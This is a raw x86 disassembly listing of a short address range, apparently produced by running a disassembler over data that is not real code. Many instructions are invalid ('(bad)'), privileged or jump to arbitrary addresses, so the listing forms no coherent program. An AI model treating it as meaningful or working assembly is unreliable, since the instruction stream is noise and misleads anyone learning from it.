  40c554:	ja     0x40c54c
  40c556:	inc    esi
  40c557:	dec    esp
  40c558:	sbb    ch,BYTE PTR [eax+0x6a]
  40c55b:	repz sub DWORD PTR [ebx+0x6960536d],ebp
  40c562:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c563:	mov    esp,0x664f94f4
  40c568:	xchg   ecx,eax
  40c569:	scas   al,BYTE PTR es:[edi]
  40c56a:	cmp    edi,DWORD PTR [edx-0x5a]
  40c56d:	push   0x662baf35
  40c572:	dec    ecx
  40c573:	dec    ecx
  40c574:	mov    edi,0x6608bc25
  40c579:	mov    cl,BYTE PTR [ecx-0x4]
  40c57c:	cmp    BYTE PTR [ecx],dh
  40c57e:	retf   0x434
  40c581:	xor    al,0xf3
  40c583:	jg     0x40c5fb
  40c585:	loop   0x40c55c
  40c587:	mov    eax,ds:0xf4d4b22a
  40c58c:	and    eax,0x586b1933
  40c591:	lods   eax,DWORD PTR ds:[esi]
  40c592:	mov    ecx,0xdc7a6ae6
  40c597:	(bad)  
  40c598:	jbe    0x40c51b
  40c59a:	inc    ebp
  40c59b:	outs   dx,DWORD PTR ds:[esi]
  40c59c:	jns    0x40c56e
  40c59e:	mov    edx,0x9e056b40
  40c5a3:	add    ebp,ebx
  40c5a5:	pop    ebx
  40c5a6:	sti    
  40c5a7:	mov    eax,ds:0x5da9ea53
  40c5ac:	in     al,0x3b
  40c5ae:	mov    ds:0xd290875f,eax
  40c5b3:	mov    edi,0xde900e8e
  40c5b8:	mov    esp,0x9f25954c
  40c5bd:	sahf   
  40c5be:	jmp    0xe61487dd
  40c5c3:	jmp    0x40c629
  40c5c5:	mov    ds:0x1c928556,eax
  40c5ca:	cmc    
  40c5cb:	ror    BYTE PTR [esi-0x65],cl
  40c5ce:	(bad)  
  40c5cf:	xchg   edi,eax
  40c5d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5d1:	sbb    al,0x2b
  40c5d3:	jle    0x40c559
  40c5d5:	mov    BYTE PTR [edi-0x14],dl
  40c5d8:	out    dx,eax
  40c5d9:	retf   
  40c5da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5db:	xchg   edx,eax
  40c5dc:	fstp   QWORD PTR [esi+esi*2-0x3a209384]
  40c5e3:	cdq    
  40c5e4:	daa    
  40c5e5:	popa   
  40c5e6:	ja     0x40c59d
  40c5e8:	and    eax,0xc8c433ed
  40c5ed:	mov    eax,ds:0x1ac7ec77
  40c5f2:	shr    DWORD PTR [ebp-0x6b434510],cl
  40c5f8:	and    eax,edx
  40c5fa:	xchg   BYTE PTR [edi],bh
  40c5fc:	dec    edi
  40c5fd:	out    0x5e,eax
  40c5ff:	repz jl 0x40c60d
  40c602:	mov    al,ds:0x221ad2c7
  40c607:	call   0xad26:0xf9a1177c
  40c60e:	(bad)  
  40c60f:	and    BYTE PTR [esi-0x35],ch
  40c612:	(bad)  
  40c613:	fxch   st(2)
  40c615:	aaa    
  40c616:	sar    DWORD PTR ds:0xa79a9355,cl
  40c61c:	mov    ?,WORD PTR [edx]
  40c61e:	mov    ch,0x6a
  40c620:	sub    ebx,DWORD PTR [ecx+0x13]
  40c623:	ficom  DWORD PTR [esi-0x4b]
  40c626:	mov    bh,0xb5
  40c628:	add    BYTE PTR [edi-0x56],0x35
  40c62c:	sub    esi,esp
  40c62e:	pop    edx
  40c62f:	sbb    al,0x8e
  40c631:	jmp    0x2770:0x360a466c
  40c638:	call   FWORD PTR [edi+0x369a5efd]
  40c63e:	mov    ebp,0xd2ad9c55
  40c643:	out    0x4d,al
  40c645:	scas   eax,DWORD PTR es:[edi]
  40c646:	cmc    
  40c647:	idiv   BYTE PTR [ebp-0x34e45923]
  40c64d:	and    eax,0xcd28c0b
  40c652:	mov    esp,0x9f09221a
  40c657:	call   DWORD PTR [eax+0x12]
  40c65a:	loopne 0x40c6c9
  40c65c:	push   esp
  40c65d:	pop    esp
  40c65e:	xor    dl,ah
  40c660:	xchg   esp,eax
  40c661:	pusha  
  40c662:	jle    0x40c666
  40c664:	fbstp  TBYTE PTR cs:[edi+0x7f]
  40c668:	jl     0x40c619
  40c66a:	imul   esp,DWORD PTR [esi-0x22],0x1
  40c66e:	fld    QWORD PTR [esp+ecx*4-0x1a]
  40c672:	inc    eax
  40c673:	or     eax,0x59717fc6
  40c678:	ret    
  40c679:	sub    ah,BYTE PTR [ebp-0x5ee7211d]
  40c67f:	cmp    edi,DWORD PTR [ecx-0x6f970ac2]
  40c685:	mov    ds:0xde15339c,al
  40c68a:	xor    DWORD PTR [edi+eiz*2-0x1d],edx
  40c68e:	stos   BYTE PTR es:[edi],al
  40c68f:	xor    al,0xa6
  40c691:	les    ecx,FWORD PTR [eax+edi*4-0x218b56a9]
  40c698:	inc    ebx
  40c699:	fist   WORD PTR [edx+0x6]
  40c69c:	jbe    0x40c642
  40c69e:	jge    0x40c65d
  40c6a0:	add    BYTE PTR [edi+0x27],dl
  40c6a3:	push   es
  40c6a4:	enter  0xea0c,0xf7
  40c6a8:	repz xchg esi,eax
  40c6aa:	loope  0x40c6af
  40c6ac:	loopne 0x40c6ac
  40c6ae:	or     BYTE PTR ds:0xe1793838,bh
  40c6b4:	in     eax,dx
  40c6b5:	xchg   edx,eax
  40c6b6:	xlat   BYTE PTR ds:[ebx]
  40c6b7:	cwde   
  40c6b8:	loopne 0x40c659
  40c6ba:	jp     0x40c70f
  40c6bc:	push   ss
  40c6bd:	add    DWORD PTR [edi+0x3eefd377],edi
  40c6c3:	retf   0x4cc5
  40c6c6:	or     DWORD PTR [eax],ebp
  40c6c8:	imul   DWORD PTR [ebp-0x660fd233]
  40c6ce:	je     0x40c678
  40c6d0:	out    0x6b,eax
  40c6d2:	add    eax,0xa566ab6
  40c6d7:	mov    ?,edx
  40c6d9:	xchg   edx,eax
  40c6da:	dec    edx
  40c6db:	push   0xffffffe2
  40c6dd:	sahf   
  40c6de:	(bad)  
  40c6df:	sub    dh,BYTE PTR [edx]
  40c6e1:	sub    al,ah
  40c6e3:	jae    0x40c761
  40c6e5:	push   ecx
  40c6e6:	xchg   ecx,eax
  40c6e7:	cmp    DWORD PTR [esi-0x2],eax
  40c6ea:	loop   0x40c71c
  40c6ec:	pop    ecx
  40c6ed:	ret    
  40c6ee:	sbb    bh,bh
  40c6f0:	test   eax,0xbbde9686
  40c6f5:	retf   0x487f
  40c6f8:	sbb    DWORD PTR [edi+ebx*8+0x33],0xffffffc9
  40c6fd:	adc    al,BYTE PTR ds:0xa0a86606
  40c703:	ficom  WORD PTR [ebp+0x20e38123]
  40c709:	in     al,dx
  40c70a:	js     0x40c6e4
  40c70c:	jmp    0xa8d3:0x6f8adb64
  40c713:	out    0xfa,al
  40c715:	icebp  
  40c716:	and    cl,BYTE PTR [esi]
  40c718:	jmp    0x40c791
  40c71a:	neg    dl
  40c71c:	inc    esp
  40c71d:	pusha  
  40c71e:	jg     0x40c6f9
  40c720:	sub    BYTE PTR [ebp-0x36],0xad
  40c724:	aas    
  40c725:	retf   0x7e65
  40c728:	int3   
  40c729:	sub    edi,eax
  40c72b:	mov    ebp,0x2306f614
  40c730:	rcr    DWORD PTR ds:0xf271ba4e,0x54
  40c737:	shl    BYTE PTR [esi-0x35],cl
  40c73a:	cmp    DWORD PTR ds:0x41b8d2d8,esi
  40c740:	push   eax
  40c741:	fmul   QWORD PTR [edi-0x565ce9a]
  40c747:	gs cli 
  40c749:	(bad)  
  40c74a:	neg    DWORD PTR [eax-0x6981f26]
  40c750:	shl    DWORD PTR [edi-0x669f32ea],1
  40c756:	mov    cl,0x72
  40c758:	addr16 cld 
  40c75a:	and    al,0xf0
  40c75c:	arpl   WORD PTR [ebx],ax
  40c75e:	stos   DWORD PTR es:[edi],eax
  40c75f:	jnp    0x40c75d
  40c761:	xchg   ecx,eax
  40c762:	push   cs
  40c763:	jmp    0x1fdff2b7
  40c768:	(bad)
  40c76c:	adc    eax,0x9f16a04b
  40c771:	cs hlt 
  40c773:	lahf   
  40c774:	aad    0x8f
  40c776:	clc    
  40c777:	jne    0x40c73f
  40c779:	cmp    eax,0xfe2002e2
  40c77e:	sbb    BYTE PTR [edi-0x6d4ad238],0xc7
  40c785:	pop    ds
  40c786:	lods   eax,DWORD PTR ds:[esi]
  40c787:	aam    0x5a
  40c789:	call   0x3bfd99f5
  40c78e:	cmp    ebx,ebx
  40c790:	imul   ebx,DWORD PTR [ecx],0x8f641331
  40c796:	push   es
  40c797:	lea    esi,[edi]
  40c799:	pop    ds
  40c79a:	std    
  40c79b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c79c:	xlat   BYTE PTR ds:[ebx]
  40c79d:	mov    ch,0x84
  40c79f:	mov    DWORD PTR [ebp+0x7],edi
  40c7a2:	xchg   ebp,eax
  40c7a3:	adc    edi,esi
  40c7a5:	add    al,0xa2
  40c7a7:	jge    0x40c7e5
  40c7a9:	addr16 dec ebp
  40c7ab:	imul   eax,DWORD PTR [esp+eax*8],0x1c
  40c7af:	adc    esp,DWORD PTR [edx]
  40c7b1:	push   ebp
  40c7b2:	ins    DWORD PTR es:[edi],dx
  40c7b3:	adc    DWORD PTR [ebp+0x119f0767],edi
  40c7b9:	jmp    0xa6b378d6
  40c7be:	pop    esi
  40c7bf:	push   cs
  40c7c0:	ret    
  40c7c1:	scas   al,BYTE PTR es:[edi]
  40c7c2:	cmp    edi,DWORD PTR [edx-0x4b6e9c4f]
  40c7c8:	sbb    al,0xf6
  40c7ca:	mov    edx,0x4d7e64b
  40c7cf:	arpl   WORD PTR [ebp+edi*2-0x30d485b4],si
  40c7d6:	std    
  40c7d7:	test   DWORD PTR [edi-0x49],eax
  40c7da:	scas   al,BYTE PTR es:[edi]
  40c7db:	sub    BYTE PTR [esi+0x17300955],al
  40c7e1:	ins    BYTE PTR es:[edi],dx
  40c7e2:	mov    al,ds:0x68f34bfd
  40c7e7:	sbb    bh,BYTE PTR [eax]
  40c7e9:	scas   al,BYTE PTR es:[edi]
  40c7ea:	pop    ebx
  40c7eb:	scas   eax,DWORD PTR es:[edi]
  40c7ec:	(bad)  
  40c7ee:	or     eax,0x6913214b
  40c7f3:	cs dec eax
  40c7f5:	xor    esi,edx
  40c7f7:	xor    edx,0xffffffd5
  40c7fa:	idiv   DWORD PTR [edx+0x14f30e1c]
  40c800:	nop
  40c801:	enter  0x4c26,0x5a
  40c805:	xchg   ebp,eax
  40c806:	imul   ebp,ebx,0x585e41b2
  40c80c:	dec    eax
  40c80d:	std    
  40c80e:	xchg   DWORD PTR [edx],eax
  40c810:	div    edi
  40c812:	addr16 pop ds
  40c814:	sbb    eax,0xfa113bf4
  40c819:	outs   dx,DWORD PTR ds:[esi]
  40c81a:	dec    edi
  40c81b:	cwde   
  40c81c:	sub    eax,0xd488f68e
  40c821:	add    eax,0x6affb85a
  40c826:	inc    ebx
  40c827:	loopne 0x40c843
  40c829:	test   esp,0x10cee37c
  40c82f:	xchg   ebp,eax
  40c830:	or     ebx,DWORD PTR [ebx+eax*4-0x44]
  40c834:	loope  0x40c7da
  40c836:	and    edx,ebp
  40c838:	add    eax,0xcef3b321
  40c83d:	je     0x40c88c
  40c83f:	int    0x3d
  40c841:	add    esi,DWORD PTR [ebx-0x7002b6cc]
  40c847:	icebp  
  40c848:	std    
  40c849:	mov    ds:0x30c68c3f,eax
  40c84e:	inc    edi
  40c84f:	enter  0x44b3,0x59
  40c853:	xor    bh,BYTE PTR [esi-0x6915eac6]
  40c859:	xchg   esi,eax
  40c85a:	(bad)  
  40c85b:	mov    edx,0x88883bec
  40c860:	jl     0x40c8a7
  40c862:	dec    esi
  40c863:	and    esi,DWORD PTR [eax]
  40c865:	add    eax,0x360c3158
  40c86a:	adc    BYTE PTR [ebx],0x5d
  40c86d:	jg     0x40c856
  40c86f:	xchg   esi,eax
  40c870:	cmp    BYTE PTR [ecx-0x73],bh
  40c873:	dec    ebx
  40c874:	xchg   ebx,eax
  40c875:	jp     0x40c84b
  40c877:	aad    0xe2
  40c879:	inc    dh
  40c87b:	adc    esp,ecx
  40c87d:	sbb    ebx,esi
  40c87f:	jmp    DWORD PTR [edx]
  40c881:	jnp    0x40c828
  40c883:	pop    edx
  40c884:	stos   DWORD PTR es:[edi],eax
  40c885:	xchg   ebp,eax
  40c886:	sub    BYTE PTR [edx+eiz*4],0x78
  40c88a:	adc    BYTE PTR [edx+0x5a],al
  40c88d:	sbb    dl,BYTE PTR [ebx]
  40c88f:	adc    eax,0xaf04fe13
  40c894:	mov    eax,0xa7dca518
  40c899:	fcom   DWORD PTR [edx+0x6813ba4]
  40c89f:	gs call 0x376f:0x3fcc3918
  40c8a7:	gs push edx
  40c8a9:	pushf  
  40c8aa:	xchg   ebp,eax
  40c8ab:	js     0x40c92b
  40c8ad:	int    0x42
  40c8af:	inc    edx
  40c8b0:	push   ecx
  40c8b1:	call   0x4e3d:0x9a407ec1
  40c8b8:	dec    edx
  40c8b9:	icebp  
  40c8ba:	xchg   edx,eax
  40c8bb:	push   es
  40c8bc:	int    0xe2
  40c8be:	arpl   WORD PTR [eax+eax*1],si
  40c8c1:	xchg   DWORD PTR [edi],edi
  40c8c3:	sbb    eax,0xbd74f3
  40c8c8:	mov    al,ds:0x955a5531
  40c8cd:	xchg   ebx,eax
  40c8ce:	push   0xffffff91
  40c8d0:	inc    ecx
  40c8d1:	mov    esi,0x3a8d6bd5
  40c8d6:	ins    DWORD PTR es:[edi],dx
  40c8d7:	inc    ebx
  40c8d8:	mov    es,ebp
  40c8da:	lock ret 0x8a8f
  40c8de:	fdivr  st(1),st
  40c8e0:	mov    ah,0x4f
  40c8e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8e3:	push   ds
  40c8e4:	inc    esp
  40c8e5:	mov    esi,0xe02f0eb3
  40c8ea:	(bad)  
  40c8eb:	or     eax,0x87372455
  40c8f0:	dec    esp
  40c8f1:	add    al,dl
  40c8f3:	mov    WORD PTR ds:[ebp-0x55bfa4e],ss
  40c8fa:	call   0xc85e3386
  40c8ff:	sub    eax,0xae37cf04
  40c904:	enter  0x47d6,0x5a
  40c908:	ins    DWORD PTR es:[edi],dx
  40c909:	rcl    BYTE PTR [esi-0x20416d23],1
  40c90f:	(bad)  
  40c910:	ins    BYTE PTR es:[edi],dx
  40c911:	stos   BYTE PTR es:[edi],al
  40c912:	adc    BYTE PTR [esi],ah
  40c914:	and    edx,DWORD PTR [esi-0x39c79c5c]
  40c91a:	repnz cld 
  40c91c:	add    dl,BYTE PTR [edx+0x2a]
  40c91f:	outs   dx,BYTE PTR ds:[esi]
  40c920:	xchg   esp,eax
  40c921:	push   cs
  40c922:	loop   0x40c8db
  40c924:	iret   
  40c925:	pusha  
  40c926:	xor    bl,BYTE PTR [ecx-0x2b1c1c]
  40c92c:	inc    esi
  40c92d:	xchg   DWORD PTR [esi],esi
  40c92f:	or     ebp,ebp
  40c931:	add    al,0xdf
  40c933:	nop
  40c934:	mov    al,0xeb
  40c936:	scas   eax,DWORD PTR es:[edi]
  40c937:	inc    esi
  40c938:	or     eax,0x895792fe
  40c93d:	test   eax,0x55c9e526
  40c942:	out    dx,al
  40c943:	adc    edx,DWORD PTR [esi+edi*2]
  40c946:	or     BYTE PTR [esi-0x6fe81dc5],dh
  40c94c:	int3   
  40c94d:	fistp  WORD PTR [ecx]
  40c94f:	lock cs out 0x49,al
  40c953:	adc    DWORD PTR [eax],esp
  40c955:	or     eax,0xb22d5b20
  40c95a:	bound  edx,QWORD PTR [eax+0x18f8a19d]
  40c960:	leave  
  40c961:	iret   
  40c962:	cmp    bl,ch
  40c964:	mov    WORD PTR [edx],ss
  40c966:	cwde   
  40c967:	sar    DWORD PTR [ebx+esi*2-0x36],cl
  40c96b:	pushf  
  40c96c:	jb     0x40c90f
  40c96e:	out    0xc2,eax
  40c970:	and    BYTE PTR [eax-0x54c9ba2d],dh
  40c976:	dec    ebp
  40c977:	mov    esp,0xbc0a135c
  40c97c:	not    dl
  40c97e:	test   eax,0x8e4c329
  40c983:	mov    BYTE PTR [esi+0x75],bh
  40c986:	pusha  
  40c987:	inc    edx
  40c988:	rcl    DWORD PTR [ebx-0x6ab641bc],0xfa
  40c98f:	mov    bl,0x99
  40c991:	sub    ch,0x0
  40c994:	xchg   ecx,eax
  40c995:	jge    0x40c976
  40c997:	sbb    eax,0xc5fbc262
  40c99c:	data16 sub al,0xc8
  40c99f:	mov    ebp,0x671bffa2
  40c9a4:	pop    esi
  40c9a5:	jnp    0x40ca08
  40c9a7:	inc    eax
  40c9a8:	loop   0x40c9ec
  40c9aa:	clc    
  40c9ab:	inc    esp
  40c9ac:	clc    
  40c9ad:	mov    edx,0xb47ca0b4
  40c9b2:	cli    
  40c9b3:	test   DWORD PTR [edi-0xd],edi
  40c9b6:	xchg   BYTE PTR [ecx+0x33],al
  40c9b9:	loope  0x40ca2f
  40c9bb:	xchg   ebx,eax
  40c9bc:	mov    ecx,0xc86e70e5
  40c9c1:	cmp    al,0x6f
  40c9c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9c4:	mov    al,ds:0x9d088f39
  40c9c9:	xchg   ebp,eax
  40c9ca:	mov    ah,0x7d
  40c9cc:	mov    ds:0x34c353a0,eax
  40c9d1:	mov    al,ds:0x8d913b91
  40c9d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9d7:	xor    bh,BYTE PTR [ebp+0x4595c24c]
  40c9dd:	cmp    ebp,DWORD PTR [ecx]
  40c9df:	push   ss
  40c9e0:	pop    ecx
  40c9e1:	inc    esp
  40c9e2:	in     al,dx
  40c9e3:	repnz lods eax,DWORD PTR ds:[esi]
  40c9e5:	mov    al,ds:0x842023eb
  40c9ea:	popa   
  40c9eb:	pop    ecx
  40c9ec:	pop    ds
  40c9ed:	test   eax,esi
  40c9ef:	int3   
  40c9f0:	ror    DWORD PTR [ebx-0x76],0x34
  40c9f4:	retf   
  40c9f5:	lahf   
  40c9f6:	jb     0x40ca38
  40c9f8:	fcom   QWORD PTR [esi-0x32]
  40c9fb:	cmp    eax,0x48db927f
  40ca00:	xchg   BYTE PTR [eax+0x565b81e8],cl
  40ca06:	jg     0x40c9f0
  40ca08:	jle    0x40c9c5
  40ca0a:	push   esp
  40ca0b:	add    DWORD PTR [esi-0x4c],eax
  40ca0e:	and    eax,0x47862039
  40ca13:	aam    0x2
  40ca15:	jg     0x40ca72
  40ca17:	mov    esi,0x88643a78
  40ca1c:	jmp    0x40ca31
  40ca1e:	sti    
  40ca1f:	jle    0x40c9a8
  40ca21:	mov    dh,0x8f
  40ca23:	add    DWORD PTR [eax-0x420b7e2d],ecx
  40ca29:	xor    BYTE PTR [ecx],cl
  40ca2b:	push   ecx
  40ca2c:	mov    ecx,0x6d5029d2
  40ca31:	xchg   esi,eax
  40ca32:	(bad)  
  40ca33:	(bad)  
  40ca34:	dec    ebp
  40ca35:	les    eax,FWORD PTR [ebx*2-0x49b88fd]
  40ca3c:	call   0x8254:0xe8c31555
  40ca43:	push   ebp
  40ca44:	push   esp
  40ca45:	clc    
  40ca46:	mov    ebp,DWORD PTR [ecx]
  40ca48:	icebp  
  40ca49:	ret    0x77c2
  40ca4c:	cdq    
  40ca4d:	ret    0x9c52
  40ca50:	popf   
  40ca51:	outs   dx,BYTE PTR ds:[esi]
  40ca52:	fild   DWORD PTR ds:0x51d749cd
  40ca58:	adc    al,0x5e
  40ca5a:	or     BYTE PTR [esi+0x20d015bd],dh
  40ca60:	in     al,dx
  40ca61:	push   es
  40ca62:	fwait
  40ca63:	imul   ebx,DWORD PTR [esi-0x4a],0xffffffcf
  40ca67:	loopne 0x40cae4
  40ca69:	sub    ebx,DWORD PTR [ecx-0x28]
  40ca6c:	sub    bl,BYTE PTR [esi+0x64]
  40ca6f:	lock in al,dx
  40ca71:	clc    
  40ca72:	xor    BYTE PTR [ebx-0x27a5f485],ch
  40ca78:	cmp    al,0xb4
  40ca7a:	lahf   
  40ca7b:	and    edx,DWORD PTR [eax+eiz*1+0xbd795cf]
  40ca82:	inc    edx
  40ca83:	loopne 0x40cabf
  40ca85:	aam    0x36
  40ca87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca88:	mov    cl,0x5
  40ca8a:	lods   al,BYTE PTR ds:[esi]
  40ca8b:	and    BYTE PTR [esi-0x7c],cl
  40ca8e:	clc    
  40ca8f:	dec    ebp
  40ca90:	or     eax,0x5721cc67
  40ca95:	xor    al,0x46
  40ca97:	(bad)  
  40ca98:	lahf   
  40ca99:	mov    dh,0x83
  40ca9b:	test   BYTE PTR [esi],bh
  40ca9d:	mov    al,ds:0x9c1dda0a
  40caa2:	add    DWORD PTR [eax-0x36c4fa27],ecx
  40caa8:	adc    eax,0xff785a19
  40caad:	hlt    
  40caae:	les    edx,FWORD PTR [ecx+esi*4-0x46d39032]
  40cab5:	and    dh,cl
  40cab7:	mov    bh,0xac
  40cab9:	gs cld 
  40cabb:	pop    ecx
  40cabc:	add    BYTE PTR [ebx],0x3d
  40cabf:	popa   
  40cac0:	mov    cl,ch
  40cac2:	sub    bh,cl
  40cac4:	mov    bl,al
  40cac6:	call   0xe1aa:0x3b429bf6
  40cacd:	ja     0x40cb0d
  40cacf:	aaa    
  40cad0:	dec    eax
  40cad1:	cwde   
  40cad2:	mov    al,ds:0x5e9f29ce
  40cad7:	jp     0x40caf6
  40cad9:	adc    eax,0x8a37cdaa
  40cade:	mov    dl,0xa
  40cae0:	pop    esi
  40cae1:	fcomp  DWORD PTR [ecx-0xf]
  40cae4:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40cae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cae7:	lock aaa 
  40cae9:	aad    0x4b
  40caeb:	pop    eax
  40caec:	push   edx
  40caed:	xchg   ebx,eax
  40caee:	icebp  
  40caef:	outs   dx,BYTE PTR ds:[esi]
  40caf0:	or     edx,DWORD PTR [edx+edx*1+0x14ab7b86]
  40caf7:	loop   0x40cb55
  40caf9:	jbe    0x40cb55
  40cafb:	mov    bl,0x91
  40cafd:	jnp    0x40cb13
  40caff:	pop    ss
  40cb00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb01:	jge    0x40cab2
  40cb03:	xchg   esi,eax
  40cb04:	push   ds
  40cb05:	fnstenv [ebp-0x2c]
  40cb08:	sahf   
  40cb09:	retf   0x4390
  40cb0c:	pop    gs
  40cb0e:	pop    ss
  40cb0f:	sub    BYTE PTR [ebx-0x4fdd132d],0xcd
  40cb16:	mov    bh,0xf7
  40cb18:	mov    bh,0xa1
  40cb1a:	test   BYTE PTR [ecx-0x71],bl
  40cb1d:	fsub   QWORD PTR [edi+esi*8]
  40cb20:	push   es
  40cb21:	daa    
  40cb22:	add    BYTE PTR [ebp+0x2e46e495],0x2b
  40cb29:	ret    0xcd4e
  40cb2c:	in     eax,dx
  40cb2d:	push   es
  40cb2e:	aam    0x25
  40cb30:	(bad)  
  40cb31:	sub    eax,0xfc7b5b80
  40cb36:	int    0xa3
  40cb38:	lods   al,BYTE PTR ds:[esi]
  40cb39:	mov    eax,0xbd8ab784
  40cb3e:	test   eax,0x2f44966e
  40cb43:	sub    BYTE PTR [edx],bh
  40cb45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb46:	mov    al,ds:0xf0c0510c
  40cb4b:	sub    al,0x9
  40cb4d:	lds    esi,FWORD PTR [esi+0x572cd69b]
  40cb53:	mov    ebp,0x8a696b9c
  40cb58:	push   ss
  40cb59:	cli    
  40cb5a:	xchg   ebp,eax
  40cb5b:	js     0x40cb76
  40cb5d:	mov    ds:0x87e249b,al
  40cb62:	and    eax,0x2dc095a3
  40cb67:	jmp    0x5b6d0e24
  40cb6c:	xchg   ecx,eax
  40cb6d:	mov    cl,0xfb
  40cb6f:	call   0x3e63912e
  40cb74:	(bad)  
  40cb75:	(bad)  
  40cb76:	(bad)  
  40cb77:	jb     0x40cb15
  40cb79:	int3   
  40cb7a:	push   edi
  40cb7b:	outs   dx,BYTE PTR ds:[esi]
  40cb7c:	mov    edi,0x88733874
  40cb81:	add    BYTE PTR [ebx],0xa9
  40cb84:	popa   
  40cb85:	imul   esp,DWORD PTR [edi+esi*4+0x5eb6105f],0x55
  40cb8d:	popa   
  40cb8e:	push   edi
  40cb8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb90:	pop    es
  40cb91:	out    0xaf,al
  40cb93:	out    dx,eax
  40cb94:	pop    ebp
  40cb95:	ins    DWORD PTR es:[edi],dx
  40cb96:	or     eax,0x617ac2b0
  40cb9b:	test   eax,0xe860dc58
  40cba0:	add    al,0x16
  40cba2:	push   ebx
  40cba3:	ss jle 0x40cbd3
  40cba6:	push   es
  40cba7:	jns    0x40cbb6
  40cba9:	test   DWORD PTR [edi+0x6c1699b5],edx
  40cbaf:	pop    edi
  40cbb0:	xor    esp,ecx
  40cbb2:	data16 or al,0xc1
  40cbb5:	add    eax,DWORD PTR [edi-0x81b3431]
  40cbbb:	ret    0xc02c
  40cbbe:	jmp    0x2185b18b
  40cbc3:	add    eax,0xb9d5a5e4
  40cbc8:	das    
  40cbc9:	adc    eax,0x4ab6ffce
  40cbce:	xchg   ebx,eax
  40cbcf:	or     bh,BYTE PTR [ebp+0x78]
  40cbd2:	mov    ebp,0x98cfcb2c
  40cbd7:	inc    edx
  40cbd8:	rcr    BYTE PTR [ecx-0x71c50e19],cl
  40cbde:	lea    eax,[ecx+0xa]
  40cbe1:	xchg   DWORD PTR [ebp+eiz*1+0x13afddb],ebx
  40cbe8:	push   ss
  40cbe9:	sbb    eax,0x99b9687b
  40cbee:	cwde   
  40cbef:	leave  
  40cbf0:	pop    es
  40cbf1:	daa    
  40cbf2:	push   eax
  40cbf3:	loope  0x40cbdc
  40cbf5:	pop    eax
  40cbf6:	or     al,0x9f
  40cbf8:	pop    ss
  40cbf9:	add    DWORD PTR [eax+0x69],ecx
  40cbfc:	cmp    DWORD PTR [edi+esi*8],ecx
  40cbff:	aam    0xff
  40cc01:	push   ds
  40cc02:	scas   eax,DWORD PTR es:[edi]
  40cc03:	sbb    eax,0xbe46a644
  40cc08:	int    0x78
  40cc0a:	xor    BYTE PTR [edx+0x6d48b844],ch
  40cc10:	jo     0x40cc75
  40cc12:	sub    BYTE PTR [ecx-0x3e203cdc],ah
  40cc18:	dec    esi
  40cc19:	clc    
  40cc1a:	repz push ecx
  40cc1c:	push   ebx
  40cc1d:	imul   edx,ebp,0x7e
  40cc20:	mov    eax,ds:0x9cc4d6ae
  40cc25:	sti    
  40cc26:	hlt    
  40cc27:	jle    0x40cc54
  40cc29:	mov    DWORD PTR [ebx+eiz*1],ebx
  40cc2c:	mov    edx,0x82d80b6
  40cc31:	test   DWORD PTR [eax],ebp
  40cc33:	xor    dl,BYTE PTR [edi-0x22]
  40cc36:	cld    
  40cc37:	mov    ds:0x1cbcbfad,eax
  40cc3c:	mov    esp,0xfaf893cd
  40cc41:	in     al,dx
  40cc42:	fmul   QWORD PTR [edi]
  40cc44:	xchg   ebx,eax
  40cc45:	sahf   
  40cc46:	rol    esp,0x1c
  40cc49:	fstp   DWORD PTR [ebx]
  40cc4b:	xor    al,0x3
  40cc4d:	js     0x40cc34
  40cc4f:	mov    al,fs:0x25ed69f7
  40cc55:	aad    0xe5
  40cc57:	inc    ebx
  40cc58:	jne    0x40cc87
  40cc5a:	sub    ebp,DWORD PTR [esp+ebx*8-0x3838b652]
  40cc61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc62:	adc    al,0xb5
  40cc64:	or     al,0xba
  40cc66:	dec    esi
  40cc67:	jg     0x40ccb5
  40cc69:	out    0x2c,eax
  40cc6b:	out    dx,al
  40cc6c:	call   0x4431:0xbc8dddf3
  40cc73:	lds    esp,FWORD PTR [edi]
  40cc75:	mov    ebx,0x2aa10a6
  40cc7a:	ret    
  40cc7b:	das    
  40cc7c:	push   ds
  40cc7d:	cld    
  40cc7e:	sub    ebx,DWORD PTR [ecx+0x49]
  40cc81:	stos   DWORD PTR es:[edi],eax
  40cc82:	dec    ebp
  40cc83:	lods   eax,DWORD PTR ds:[esi]
  40cc84:	cmp    BYTE PTR [edi-0xf2044cd],bh
  40cc8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc8b:	jge    0x40ccd3
  40cc8d:	cmp    DWORD PTR [ebp+0x42],edx
  40cc90:	jg     0x40cc14
  40cc92:	hlt    
  40cc93:	(bad)  
  40cc94:	stos   BYTE PTR es:[edi],al
  40cc95:	pusha  
  40cc96:	sub    al,0x4e
  40cc98:	mov    edi,ebx
  40cc9a:	ins    DWORD PTR es:[edi],dx
  40cc9b:	cmp    edi,ecx
  40cc9d:	add    eax,0x5a377857
  40cca2:	je     0x40cccd
  40cca4:	(bad)  
  40cca5:	lds    ebx,FWORD PTR [esi-0x529a775f]
  40ccab:	clc    
  40ccac:	mov    dl,BYTE PTR [edi+edi*1]
  40ccaf:	in     eax,dx
  40ccb0:	sbb    al,0x7d
  40ccb2:	popf   
  40ccb3:	arpl   sp,ax
  40ccb5:	call   0x86b184c2
  40ccba:	and    dl,BYTE PTR ds:0xbe40984
  40ccc0:	adc    edi,0x49
  40ccc3:	push   esp
  40ccc4:	cmp    DWORD PTR [edx-0x3c9a66af],esp
  40ccca:	xlat   BYTE PTR ds:[ebx]
  40cccb:	mov    bh,0xe4
  40cccd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccce:	push   cs
  40cccf:	call   0x8707d9fa
  40ccd4:	push   eax
  40ccd5:	jne    0x40ccf3
  40ccd7:	popf   
  40ccd8:	mov    eax,0x7ef2a0e6
